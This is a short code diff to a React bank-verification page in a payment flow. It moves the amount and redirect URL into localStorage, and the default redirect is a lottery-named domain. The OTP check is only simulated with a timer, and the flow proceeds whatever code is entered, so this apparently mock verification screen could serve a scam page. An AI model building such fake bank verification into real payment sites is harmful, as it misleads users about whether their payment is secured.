@@ -12,8 +12,19 @@ function BankVerificationContent() {
   const [canResend, setCanResend] = useState(false);
 
   const method = searchParams.get('method') || 'credit-card';
-  const amount = searchParams.get('amount') || '0';
-  const redirectUrl = searchParams.get('redirect_url') || 'http://dubaibiglottery.ae';
+  
+  // Get payment data from localStorage
+  const getPaymentData = () => {
+    if (typeof window !== 'undefined') {
+      const data = localStorage.getItem('paymentData');
+      return data ? JSON.parse(data) : {};
+    }
+    return {};
+  };
+
+  const paymentData = getPaymentData();
+  const amount = paymentData.amount || '0';
+  const redirectUrl = paymentData.redirect_url || 'http://dubaibiglottery.ae';
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -42,7 +53,7 @@ function BankVerificationContent() {
     // Simulate OTP verification
     setTimeout(() => {
       setIsLoading(false);
-      router.push(`/payment/processing?method=${method}&amount=${amount}&redirect_url=${encodeURIComponent(redirectUrl)}`);
+      router.push(`/payment/processing?method=${method}`);
     }, 2000);
   };
 
